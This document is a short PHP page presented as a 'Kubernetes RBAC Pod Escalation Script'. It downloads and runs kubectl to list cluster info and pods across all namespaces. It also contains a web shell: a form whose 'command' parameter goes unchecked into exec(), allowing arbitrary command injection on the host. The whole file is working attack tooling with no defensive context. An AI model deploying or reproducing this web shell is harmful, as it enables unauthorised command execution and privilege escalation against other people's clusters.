<html>
<head>
  <title>Kubernetes RBAC Pod Escalation by Damian Naprawa</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
</head>
<body>
  <div class="container">

<?php

/**
 * @file
 * Download kubectl and attempt to execute cluster operations.
 */

$commands_to_test = [
  'kubectl cluster-info',
  'kubectl get pods --all-namespaces',
];

// Get current kubernetes release version.
$k8s_version = trim(file_get_contents('https://storage.googleapis.com/kubernetes-release/release/stable.txt'));

// Download kubectl if it's not already present.
if (!file_exists('kubectl')) {
  file_put_contents('kubectl', fopen("https://storage.googleapis.com/kubernetes-release/release/$k8s_version/bin/linux/amd64/kubectl", 'r'));
  chmod('kubectl', 0775);
}

echo '<h1>RBAC Pod Escalation Script</h1>';

echo '<form method="get">
<input type="textarea" class="form-control w-50" name="command" />
<input type="submit" name="button" class="button" value="Execute kubectl command" />
</form>';

$customCommand = $_GET['command'];

if ($customCommand) {
  exec("./$customCommand 2>&1", $output, $return);

  // Strip ANSI codes.
  $output = preg_replace('/\e[[][A-Za-z0-9];?[0-9]*m?/', '', $output);
  
  // Print the result.
  echo "<h2>Result of <code>$customCommand</code></h2>";
  echo '<p>Return code: <code>' . print_r($return, TRUE) . '</code></p>';
  echo '<pre class="border">';
  foreach ($output as $line) {
    echo $line . "\r\n";
  }
  echo '</pre>';
  
  // Clear the output var.
  $output = [];
}


// Loop through commands and attempt to run them.
foreach ($commands_to_test as $command) {
  // Execute the command.
  exec("./$command 2>&1", $output, $return);

  // Strip ANSI codes.
  $output = preg_replace('/\e[[][A-Za-z0-9];?[0-9]*m?/', '', $output);

  // Print the result.
  echo "<h2>Result of <code>$command</code></h2>";
  echo '<p>Return code: <code>' . print_r($return, TRUE) . '</code></p>';
  echo '<pre class="border">';
  foreach ($output as $line) {
    echo $line . "\r\n";
  }
  echo '</pre>';

  // Clear the output var.
  $output = [];
}

?>

  </div>
</body>
</html>